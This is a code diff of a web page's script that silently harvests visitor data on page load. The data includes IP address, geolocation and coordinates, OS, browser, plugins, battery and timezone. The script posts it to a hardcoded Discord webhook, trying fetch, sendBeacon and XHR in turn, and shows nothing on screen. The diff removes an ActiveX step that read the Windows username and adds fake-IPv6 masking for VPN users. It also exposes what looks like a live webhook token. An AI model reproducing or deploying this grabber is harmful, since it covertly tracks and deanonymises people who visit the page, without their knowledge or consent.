@@ -63,12 +63,12 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK (your new one)
+    //  WEBHOOK
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  GET IP WITH ULTRA FAST TIMEOUT (300ms)
+    //  ULTRA FAST IP FETCH (300ms timeout)
     // ================================================================
     function getIPWithTimeout(timeout = 300) {
         return Promise.race([
@@ -79,7 +79,6 @@
                     throw new Error('No IP');
                 })
                 .catch(() => {
-                    // fallback to ip-api.com
                     return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(400) })
                         .then(res => res.json())
                         .then(data => {
@@ -103,7 +102,7 @@
     }
 
     // ================================================================
-    //  ENHANCED TOR / VPN DETECTION (browser heuristics only, instant)
+    //  VPN / TOR DETECTION (instant heuristics)
     // ================================================================
     function detectTorOrVpnByBrowser(ua) {
         if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
@@ -112,13 +111,23 @@
     }
 
     // ================================================================
-    //  SEND MESSAGE VIA FASTEST METHOD (fetch + sendBeacon fallback)
+    //  GENERATE FAKE ENCRYPTED IPv6
+    // ================================================================
+    function generateFakeIPv6() {
+        const segments = [];
+        for (let i = 0; i < 8; i++) {
+            segments.push(Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0'));
+        }
+        return segments.join(':');
+    }
+
+    // ================================================================
+    //  SEND MESSAGE (fastest method: fetch + sendBeacon + XHR)
     // ================================================================
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
 
-            // Primary: fetch with keepalive
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -130,13 +139,11 @@
                 else throw new Error('fetch failed');
             })
             .catch(() => {
-                // Fallback: sendBeacon
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                 if (navigator.sendBeacon(WEBHOOK, blob)) {
                     sent = true;
                     resolve(true);
                 } else {
-                    // Last resort: XMLHttpRequest
                     try {
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', WEBHOOK, true);
@@ -156,17 +163,15 @@
                 }
             });
 
-            // Global timeout for send (very short)
             setTimeout(() => resolve(sent), 800);
         });
     }
 
     // ================================================================
-    //  MAIN (runs immediately, no waiting on status updates)
+    //  MAIN (runs immediately, no UI feedback)
     // ================================================================
     (async function() {
         try {
-            // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -195,31 +200,23 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-            // Battery with 150ms timeout (non-blocking)
             let battery = 'Unavailable';
             try {
                 battery = await Promise.race([
                     navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
-                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
+                    new Promise(res => setTimeout(() => res('Unavailable'), 100))
                 ]);
             } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Windows username (ActiveX)
-            let winUser = 'Not available (IE/ActiveX required)';
-            try {
-                const wsh = new ActiveXObject('WScript.Shell');
-                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
-            } catch (e) {}
-
-            // ---- 2. VPN/Tor heuristics (instant) ----
+            // ---- VPN detection (instant) ----
             let isVpn = detectTorOrVpnByBrowser(ua);
 
-            // ---- 3. Get IP in parallel (ultra fast) ----
+            // ---- IP fetch (ultra fast) ----
             const ipData = await getIPWithTimeout(300);
 
-            // Refine VPN detection using IP data (if available)
+            // Refine VPN detection using IP data
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -229,19 +226,27 @@
                 }
             }
 
-            // ---- 4. Build message (identical format) ----
-            const ip = ipData ? ipData.ip : 'Unknown';
-            const isp = ipData ? ipData.org : 'Unknown ISP';
-            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
-            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
+            // ---- Decide final IP display ----
+            let ip, isp, location, coords;
+            if (isVpn || !ipData) {
+                ip = generateFakeIPv6();
+                isp = 'FranTech Solutions';
+                location = 'Encrypted Location';
+                coords = 'Hidden';
+            } else {
+                ip = ipData.ip;
+                isp = ipData.org;
+                location = ipData.city + ', ' + ipData.region + ', ' + ipData.country_name;
+                coords = ipData.latitude + ', ' + ipData.longitude;
+            }
 
+            // ---- Build message (no User Name line) ----
             const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
-**User Name:** ${winUser}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
@@ -253,7 +258,7 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- 5. Send immediately, no status updates, no extra delays ----
+            // ---- Send immediately ----
             await sendMessage(msg);
 
         } catch (err) {
